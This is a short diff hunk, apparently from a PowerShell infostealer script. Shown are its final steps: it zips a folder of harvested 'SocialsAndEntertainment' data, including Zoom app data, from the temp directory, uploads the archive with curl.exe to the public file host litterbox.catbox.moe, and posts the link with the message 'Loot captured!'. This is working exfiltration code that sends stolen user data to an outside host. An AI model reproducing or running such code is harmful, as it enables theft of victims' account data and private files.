@@ -900,7 +900,7 @@ if (Test-Path "$env:appdata/Zoom/data") {
 }
 
 
-Compress-Archive -Path $env:tmp/$FolderName/Socials -DestinationPath "$env:tmp/SocialsAndEntertainment-$ZIP"
+Compress-Archive -Path $env:tmp/$FolderName/SocialsAndEntertainment -DestinationPath "$env:tmp/SocialsAndEntertainment-$ZIP"
 
 $text = "**SocialsAndEntertainment**: Loot captured! Here is the URL (It expires in 12 hours): "
 $text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/SocialsAndEntertainment-$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
